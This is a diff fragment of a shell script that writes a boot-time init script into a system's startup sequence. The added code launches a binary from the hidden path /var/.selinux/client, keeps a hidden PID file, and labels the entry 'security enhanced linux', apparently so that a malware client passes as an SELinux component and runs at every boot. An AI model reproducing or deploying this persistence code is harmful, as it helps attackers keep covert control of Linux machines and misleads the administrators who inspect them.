@@ -47,8 +47,32 @@ do
         echo "#!/bin/sh" >> $new_S_file_name
         echo "#alexjlz" >> $new_S_file_name
         echo "#security enhanced linux" >> $new_S_file_name
-        echo "sleep 60" >> $new_S_file_name
-        echo "${base_location}client" >> $new_S_file_name
+        echo '
+PATH=/bin:/usr/bin:/sbin:/usr/sbin
+DAEMON=/var/.selinux/client
+PIDFILE=/var/run/.selinux.pid
+
+test -x $DAEMON || exit 0
+
+. /lib/lsb/init-functions
+
+case "$1" in
+  start)
+	start_daemon -p $PIDFILE $DAEMON
+    ;;
+  stop)
+    ;;
+  force-reload|restart)
+    ;;
+  status)
+    ;;
+  *)
+    exit 1
+    ;;
+esac
+
+exit 0' >> $new_S_file_name
+        chmod a+x $new_S_file_name
         break
     else
         this_file=`ls | grep "^S$count_down_from"`
